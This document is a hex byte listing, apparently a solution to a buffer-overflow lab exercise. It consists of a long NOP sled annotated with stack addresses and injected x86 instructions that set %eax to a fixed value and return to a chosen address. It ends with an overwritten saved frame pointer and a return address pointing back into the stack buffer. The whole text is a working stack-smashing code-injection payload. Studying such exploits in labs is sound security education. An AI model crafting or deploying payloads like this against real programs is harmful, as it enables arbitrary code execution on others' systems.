90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90		/* 0x55683408 */
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90		/* 0x55683418 */
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90		/* 0x55683428 */
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90		/* 0x55683438 */
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90		/* 0x55683448 */
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90		/* 0x55683458 */
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90		/* 0x55683468 */
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90		/* 0x55683478 */
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90		/* 0x55683488 */
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90		/* 0x55683498 */
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90		/* 0x556834a8 */
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90		/* 0x556834b8 */
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90		/* 0x556834c8 */
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90		/* 0x556834d8 */
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90		/* 0x556834e8 */
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90		/* 0x556834f8 */

90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90		/* 0x55683508 */
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90		/* 0x55683518 */
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90		/* 0x55683528 */
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90		/* 0x55683538 */
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90		/* 0x55683548 */
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90		/* 0x55683558 */
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90		/* 0x55683568 */
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90		/* 0x55683578 */
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90		/* 0x55683588 */
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90		/* 0x55683598 */
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90		/* 0x556835a8 */
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90		/* 0x556835b8 */
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90		/* 0x556835c8 */
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90		/* 0x556835d8 */
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90		/* 0x556835e8 */
90

8d 6c 24 18				/* lea	  0x18(%esp),%ebp */
b8 bc 0f a6 76       	/* mov    $0x76a60fbc,%eax */
68 c0 8c 04 08       	/* push   $0x8048cc0 */
c3                   	/* ret    */

90 90 90 90 90 90 90 90
b0 36 68 55				/* old %ebp.	*/
e8 35 68 55				/* the address before buf. */
